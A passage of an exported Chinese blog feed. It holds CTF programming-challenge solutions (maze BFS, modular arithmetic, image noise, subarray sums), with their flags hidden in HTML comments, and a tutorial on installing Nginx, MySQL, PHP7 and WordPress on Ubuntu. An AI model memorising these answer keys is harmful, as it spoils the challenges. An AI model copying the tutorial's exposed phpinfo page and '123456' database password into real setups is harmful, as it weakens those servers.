<span class="comment">#判断找到了终点</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Iqueue</span><span class="params">(self, location)</span>:</span></span><br><span class="line">        self.queue.append(location)</span><br><span class="line">        self.steptrace.append(location)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Oqueue</span><span class="params">(self)</span>:</span></span><br><span class="line">        temp = self.queue[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">del</span> (self.queue[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Void</span><span class="params">(self, location)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> location <span class="keyword">in</span> self.steptrace <span class="keyword">or</span> self.migong[location[<span class="number">0</span>]][location[<span class="number">1</span>]] == <span class="string">"X"</span>:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> location == self.end:</span><br><span class="line">                    self.sucess=<span class="number">1</span></span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                self.steptrace.append(location)</span><br><span class="line">                self.Iqueue(location)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"error"</span></span><br><span class="line">            <span class="keyword">print</span> location</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">empty</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.queue[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">except</span> IndexError:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addx</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> x &gt;= self.len: <span class="keyword">return</span> x - <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">subx</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        x -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> x &lt; <span class="number">0</span>: <span class="keyword">return</span> x + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> str(self.zoumigong())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">zoumigong</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> self.empty():</span><br><span class="line">            location = self.Oqueue()</span><br><span class="line">            <span class="comment">#print location</span></span><br><span class="line">            self.Void([self.addx(location[<span class="number">0</span>]),location[<span class="number">1</span>]])</span><br><span class="line">            self.Void([self.subx(location[<span class="number">0</span>]), location[<span class="number">1</span>]])</span><br><span class="line">            self.Void([location[<span class="number">0</span>],self.addx(location[<span class="number">1</span>])])</span><br><span class="line">            self.Void([location[<span class="number">0</span>], self.subx(location[<span class="number">1</span>])])</span><br><span class="line">            <span class="comment"># 上下左右各试探一下</span></span><br><span class="line">            <span class="keyword">if</span> self.sucess==<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># localtion=[x,y]</span></span><br><span class="line"><span class="comment"># migong[location[0],local[1]]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    openfile()</span><br></pre></td></tr></table></figure></p><p>flag很坑，访问输出的url（去掉flagsiurl），题目的链接就是flag，格式CTF{}</p><p style="display:none;">CTF{<a href="http://ctf5.shiyanbar.com/crypto/Crypto1}" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/crypto/Crypto1}</a></p><h1 id="小球下落"><a href="#小球下落" class="headerlink" title="小球下落"></a>小球下落</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">65536</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">12345</span>):</span><br><span class="line">    tmp=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">15</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(a[tmp]==<span class="number">0</span>):</span><br><span class="line">            a[tmp]=~a[tmp]</span><br><span class="line">            tmp=tmp*<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            a[tmp]=~a[tmp]</span><br><span class="line">            tmp=tmp*<span class="number">2</span>+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">12344</span>):</span><br><span class="line">            print(tmp)</span><br></pre></td></tr></table></figure><!--CTF{36358}--><h1 id="普里姆路径"><a href="#普里姆路径" class="headerlink" title="普里姆路径"></a>普里姆路径</h1><p>参考：<a href="http://hebin.me/2017/09/10/%E8%A5%BF%E6%99%AEctf-%E6%99%AE%E9%87%8C%E5%A7%86%E8%B7%AF%E5%BE%84/" target="_blank" rel="noopener">西普CTF-普里姆路径</a><br><!--CTF{7}--></p><h1 id="大数模运算"><a href="#大数模运算" class="headerlink" title="大数模运算"></a>大数模运算</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">12345</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">12345</span>%i==<span class="number">0</span>:</span><br><span class="line">        print(i)</span><br><span class="line">key=<span class="number">12345</span></span><br><span class="line">sum=<span class="number">0</span></span><br><span class="line">key1=key2=key3=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">12346</span>):</span><br><span class="line">    key1+=<span class="number">3</span>**i%<span class="number">9901</span></span><br><span class="line">    key2+=<span class="number">5</span>**i%<span class="number">9901</span></span><br><span class="line">    key3+=<span class="number">823</span>**i%<span class="number">9901</span></span><br><span class="line">print((key1*key2*key3)%<span class="number">9901</span>)</span><br></pre></td></tr></table></figure><!--CTF{4890}--><h1 id="Noise"><a href="#Noise" class="headerlink" title="Noise"></a>Noise</h1><p>参考：<a href="http://hebin.me/2017/09/10/%E8%A5%BF%E6%99%AEctf-noise/" target="_blank" rel="noopener">西普CTF-Noise</a><br>他的代码比较早了，下面给出我改过后的python3脚本，需要安装<code>Pillow</code>库<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    im=Image.open(<span class="string">"noise.png"</span>)</span><br><span class="line">    pix=im.load()</span><br><span class="line">    width,height=im.size</span><br><span class="line"></span><br><span class="line">    bgcolor=(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>)</span><br><span class="line">    im2= Image.new(<span class="string">'RGB'</span>,(width,height),bgcolor)</span><br><span class="line">    pix2=im2.load()</span><br><span class="line"></span><br><span class="line">    count=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,width):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>,height):</span><br><span class="line">            g,b=pix[x,y][<span class="number">1</span>:]</span><br><span class="line">            pix2[g,b]=(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">            count+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count==<span class="number">12000</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    im2.show()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    foo()</span><br><span class="line">    print(<span class="string">'ok'</span>)</span><br></pre></td></tr></table></figure></p><!--CTF{L1v1ng_qu1et_1n_a_no1sy_worId}--><h1 id="聪明的打字员"><a href="#聪明的打字员" class="headerlink" title="聪明的打字员"></a>聪明的打字员</h1><p>传送门：<a href="http://www.cnblogs.com/zhanglanyun/archive/2011/05/27/2059544.html" target="_blank" rel="noopener">BFS和DFS算法分析对比及优化</a><br><!--CTF{11}--></p><h1 id="二叉树遍历"><a href="#二叉树遍历" class="headerlink" title="二叉树遍历"></a>二叉树遍历</h1><!--CTF{ACBFGED}--><p>#<br>参考：<a href="http://hebin.me/2017/09/10/%E8%A5%BF%E6%99%AEctf-%E4%B8%A4%E4%B8%AA%E6%9C%80%E5%A4%A7%E5%AD%90%E4%B8%B2%E5%92%8C/" target="_blank" rel="noopener">西普CTF-两个最大子串和</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">-132</span>,<span class="number">133</span>,<span class="number">134</span>,<span class="number">-11</span>,<span class="number">12</span>,<span class="number">-139</span>,<span class="number">-140</span>,<span class="number">62</span>,<span class="number">63</span>,<span class="number">-64</span>,<span class="number">65</span>,<span class="number">66</span>,<span class="number">67</span>,</span><br><span class="line">    <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">-6</span>,<span class="number">7</span>,<span class="number">-48</span>,<span class="number">-49</span>,<span class="number">50</span>,<span class="number">138</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">20</span>,</span><br><span class="line">    <span class="number">101</span>,<span class="number">102</span>,<span class="number">-103</span>,<span class="number">104</span>,<span class="number">-105</span>,<span class="number">106</span>,<span class="number">146</span>,<span class="number">147</span>,<span class="number">148</span>,<span class="number">-107</span>,<span class="number">108</span>,<span class="number">109</span>,<span class="number">110</span>,<span class="number">96</span>,</span><br><span class="line">    <span class="number">21</span>,<span class="number">-22</span>,<span class="number">23</span>,<span class="number">-24</span>,<span class="number">-25</span>,<span class="number">25</span>,<span class="number">-27</span>,<span class="number">-28</span>,<span class="number">-29</span>,<span class="number">30</span>,</span><br><span class="line">    <span class="number">41</span>,<span class="number">-42</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">-46</span>,<span class="number">-47</span>,</span><br><span class="line">    <span class="number">51</span>,<span class="number">52</span>,<span class="number">-53</span>,<span class="number">54</span>,<span class="number">-55</span>,<span class="number">-56</span>,<span class="number">57</span>,<span class="number">-58</span>,<span class="number">59</span>,<span class="number">60</span>,</span><br><span class="line">    <span class="number">73</span>,<span class="number">-74</span>,<span class="number">75</span>,<span class="number">-71</span>,<span class="number">-72</span>,<span class="number">18</span>,<span class="number">-97</span>,<span class="number">-98</span>,<span class="number">19</span>,<span class="number">-129</span>,<span class="number">130</span>,</span><br><span class="line">    <span class="number">-137</span>,<span class="number">136</span>,<span class="number">-13</span>,<span class="number">14</span>,<span class="number">144</span>,<span class="number">-145</span>,<span class="number">15</span>,<span class="number">128</span>,</span><br><span class="line">    <span class="number">77</span>,<span class="number">-78</span>,<span class="number">-31</span>,<span class="number">32</span>,<span class="number">35</span>,<span class="number">-76</span>,<span class="number">149</span>,<span class="number">-150</span>,<span class="number">99</span>,<span class="number">100</span>,<span class="number">119</span>,</span><br><span class="line">    <span class="number">91</span>,<span class="number">-92</span>,<span class="number">-93</span>,<span class="number">94</span>,<span class="number">95</span>,<span class="number">116</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">118</span>,<span class="number">120</span>,</span><br><span class="line">    <span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>,<span class="number">-84</span>,<span class="number">85</span>,<span class="number">-122</span>,<span class="number">-123</span>,</span><br><span class="line">    <span class="number">112</span>,<span class="number">111</span>,<span class="number">-43</span>,<span class="number">44</span>,<span class="number">45</span>,<span class="number">-113</span>,<span class="number">-115</span>,<span class="number">36</span>,<span class="number">-37</span>,<span class="number">-38</span>,<span class="number">39</span>,<span class="number">40</span>,<span class="number">25</span>,<span class="number">126</span>,<span class="number">127</span>,</span><br><span class="line">    <span class="number">131</span>,<span class="number">-135</span>,<span class="number">61</span>,<span class="number">-69</span>,<span class="number">70</span>,</span><br><span class="line">    <span class="number">141</span>,<span class="number">-142</span>,<span class="number">143</span>,<span class="number">-86</span>,<span class="number">68</span>,<span class="number">-87</span>,<span class="number">-90</span>,</span><br><span class="line">    <span class="number">121</span>,<span class="number">-88</span>,<span class="number">89</span>,<span class="number">-124</span>,<span class="number">-179</span>,<span class="number">-80</span>,<span class="number">-33</span>,<span class="number">34</span>]</span><br><span class="line">value1=[<span class="number">-99999</span>]*<span class="number">150</span></span><br><span class="line">value2=[<span class="number">-99999</span>]*<span class="number">150</span></span><br><span class="line">max=<span class="number">0</span></span><br><span class="line">sum=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">150</span>): </span><br><span class="line">    sum+=a[i]</span><br><span class="line">    <span class="keyword">if</span> max&lt;sum:</span><br><span class="line">        max=sum</span><br><span class="line">    value1[i]=max</span><br><span class="line">    <span class="keyword">if</span> sum&lt;<span class="number">0</span>:</span><br><span class="line">        sum=<span class="number">0</span></span><br><span class="line">max=<span class="number">0</span></span><br><span class="line">sum=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">149</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    sum+=a[i]</span><br><span class="line">    <span class="keyword">if</span> max&lt;sum:</span><br><span class="line">        max=sum</span><br><span class="line">    value2[i]=max</span><br><span class="line">    <span class="keyword">if</span> sum&lt;<span class="number">0</span>:</span><br><span class="line">        sum=<span class="number">0</span></span><br><span class="line">max=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">149</span>):</span><br><span class="line">    <span class="keyword">if</span>(value1[i]+value2[i+<span class="number">1</span>]&gt;max):</span><br><span class="line">        max=value1[i]+value2[i+<span class="number">1</span>]</span><br><span class="line">print(max)</span><br></pre></td></tr></table></figure></p><!--CTF{3239}--><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验吧 </tag>
            
            <tag> PPC </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>团队博客搭建</title>
      <link href="/2018/04/09/%E5%9B%A2%E9%98%9F%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/2018/04/09/%E5%9B%A2%E9%98%9F%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>搭建Ubuntu+Nginx+MySQL+PHP7环境</p></blockquote><a id="more"></a><h1 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h1><p>教程参考<a href="https://segmentfault.com/a/1190000013035065" target="_blank" rel="noopener">https://segmentfault.com/a/1190000013035065</a></p><h2 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install nginx</span><br></pre></td></tr></table></figure><p>安装好后访问本地IP(或域名)<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog-group/1.png" alt="" title="" class="">                <p></p>            </figure></p><h2 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mysql-server</span><br></pre></td></tr></table></figure><p>安装过程会提示输入root密码</p><h2 id="安装PHP7"><a href="#安装PHP7" class="headerlink" title="安装PHP7"></a>安装PHP7</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php-fpm php-mysql</span><br></pre></td></tr></table></figure><h1 id="配置修改"><a href="#配置修改" class="headerlink" title="配置修改"></a>配置修改</h1><p>修改Nginx的配置文件中的server配置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">listen 80 default_server;</span><br><span class="line">listen [::]:80 default_server;</span><br><span class="line"></span><br><span class="line"><span class="comment"># SSL configuration</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># listen 443 ssl default_server;</span></span><br><span class="line"><span class="comment"># listen [::]:443 ssl default_server;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Note: You should disable gzip for SSL traffic.</span></span><br><span class="line"><span class="comment"># See: https://bugs.debian.org/773332</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Read up on ssl_ciphers to ensure a secure configuration.</span></span><br><span class="line"><span class="comment"># See: https://bugs.debian.org/765782</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Self signed certs generated by the ssl-cert package</span></span><br><span class="line"><span class="comment"># Don't use them in a production server!</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># include snippets/snakeoil.conf;</span></span><br><span class="line"></span><br><span class="line">root /var/www/html;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add index.php to the list if you are using PHP</span></span><br><span class="line">index index.php index.html index.htm index.nginx-debian.html; <span class="comment"># 这里需要添加一个index.php</span></span><br><span class="line"></span><br><span class="line">server_name 10.128.2.55; <span class="comment"># 本机IP地址</span></span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line"><span class="comment"># First attempt to serve request as file, then</span></span><br><span class="line"><span class="comment"># as directory, then fall back to displaying a 404.</span></span><br><span class="line">try_files <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.php;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">location ~ \.php$ &#123;</span><br><span class="line">include snippets/fastcgi-php.conf;</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">## With php7.0-cgi alone:</span></span><br><span class="line"><span class="comment">#fastcgi_pass 127.0.0.1:9000;</span></span><br><span class="line"><span class="comment">## With php7.0-fpm:</span></span><br><span class="line">fastcgi_pass unix:/run/php/php7.0-fpm.sock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># deny access to .htaccess files, if Apache's document root</span></span><br><span class="line"><span class="comment"># concurs with nginx's one</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">location ~ /\.ht &#123;</span><br><span class="line">deny all;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重启服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/nginx restart</span><br></pre></td></tr></table></figure></p><p>测试PHP与Nginx有没有集成成功(路径是在之前nginx配置文件中的”root /var/ww/html;”)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /var/www/html/info.php</span><br></pre></td></tr></table></figure></p><p>内容为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>再次访问，看到php信息则访问成功<br><br></p><h1 id="wordpress部署"><a href="#wordpress部署" class="headerlink" title="wordpress部署"></a>wordpress部署</h1><h2 id="下载最新版"><a href="#下载最新版" class="headerlink" title="下载最新版"></a>下载最新版</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://wordpress.org/latest.tar.gz</span><br></pre></td></tr></table></figure><p> 命令行下载较慢，可以直接打开连接下载，然后传到服务器上</p><h2 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf latest.tar.gz</span><br></pre></td></tr></table></figure><h2 id="创建wordpress需要用到的数据库和用户"><a href="#创建wordpress需要用到的数据库和用户" class="headerlink" title="创建wordpress需要用到的数据库和用户"></a>创建wordpress需要用到的数据库和用户</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p <span class="comment"># 然后输入之前设置的密码</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 创建数据库：</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> wordpress;</span><br><span class="line"># 创建用户：</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> wordpress@localhost;</span><br><span class="line"># 设置密码：</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">PASSWORD</span> <span class="keyword">FOR</span> wordpress@localhost=<span class="keyword">PASSWORD</span>(<span class="string">"your password"</span>);</span><br><span class="line"># 配置权限：</span><br><span class="line"><span class="keyword">GRANT</span> ALL <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> wordpress.* <span class="keyword">TO</span> wordpress@localhost <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'your password'</span>;</span><br><span class="line"># 刷新权限配置：</span><br><span class="line"><span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span>;</span><br></pre></td></tr></table></figure><p><br></p><h2 id="配置WordPress"><a href="#配置WordPress" class="headerlink" title="配置WordPress"></a>配置WordPress</h2><p>重命名示例文件wp-config（此处的路径/root/wordpress对应你自己的存放路径）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /root/wordpress/wp-config-sample.php /root/wordpress/wp-config.php</span><br></pre></td></tr></table></figure></p><p>修改的内容包括DB_NAME，DB_USER，DB_PASSWORD,如果数据库不在本地则修改DB_HOST<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line">define(<span class="string">'DB_NAME'</span>, <span class="string">'wordpress'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line">define(<span class="string">'DB_USER'</span>, <span class="string">'wordpress'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line">define(<span class="string">'DB_PASSWORD'</span>, <span class="string">'123456'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line">define(<span class="string">'DB_HOST'</span>, <span class="string">'localhost'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database Charset to use in creating database tables. */</span></span><br><span class="line">define(<span class="string">'DB_CHARSET'</span>, <span class="string">'utf8'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The Database Collate type. Don't change this if in doubt. */</span></span><br><span class="line">define(<span class="string">'DB_COLLATE'</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h2><p>将wordpress内容全部拷贝到之前的html路径下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r /root/wordpress/* /var/www/html</span><br></pre></td></tr></table></figure></p><p>修改权限：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R www-data:www-data /var/www/html</span><br></pre></td></tr></table></figure></p><p>重启Nginx服务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/nginx restart</span><br></pre></td></tr></table></figure></p><h2 id="安装WordPress"><a href="#安装WordPress" class="headerlink" title="安装WordPress"></a>安装WordPress</h2><p>访问IP<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog-group/2.png" alt="" title="" class="">                <p></p>            </figure><br>选择语言-&gt;设置标题与管理员用户名与密码以及电子邮件-&gt;安装WordPress<br>访问http: //your_ip/wp-login.php ,输入刚才的用户名、密码进入后台进行管理<br><br></p><h1 